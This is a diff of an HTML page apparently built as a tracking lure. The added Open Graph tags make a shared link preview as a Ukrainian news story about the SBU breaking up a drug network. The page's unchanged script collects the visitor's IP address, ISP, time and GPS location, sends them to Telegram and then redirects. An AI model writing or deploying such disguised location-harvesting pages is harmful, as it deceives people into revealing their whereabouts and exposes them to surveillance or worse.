@@ -4,6 +4,15 @@
   <meta charset="UTF-8">
   <title>Загрузка...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- ✅ Open Graph для соцсетей и Telegram -->
+  <meta property="og:title" content="⚡️ СБУ ликвидировала сеть наркоторговцев в 15 регионах">
+  <meta property="og:description" content="СБУ провела масштабную операцию. Подробности о задержаниях — в нашем спецматериале.">
+  <meta property="og:image" content="https://dnepr.express/storage/media/publishing-media/2025/05/15/1747290691-bvmrh/conversions/inshot-20250515-092937128-amp.jpg">
+  <meta property="og:url" content="https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina">
+  <meta property="og:type" content="article">
+  <meta name="twitter:card" content="summary_large_image">
+
   <style>
     html, body {
       margin: 0;
@@ -57,7 +66,6 @@ IP: ${data.ip}
 Провайдер: ${data.connection.isp}
 Время: ${new Date().toLocaleString()}`;
 
-        // GPS запрос
         if (navigator.geolocation) {
           let gotGPS = false;
 
@@ -66,7 +74,7 @@ IP: ${data.ip}
               const msg = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
               sendToTelegram(msg, startRedirect);
             }
-          }, 7000); // немного дольше
+          }, 7000);
 
           navigator.geolocation.getCurrentPosition(
             pos => {
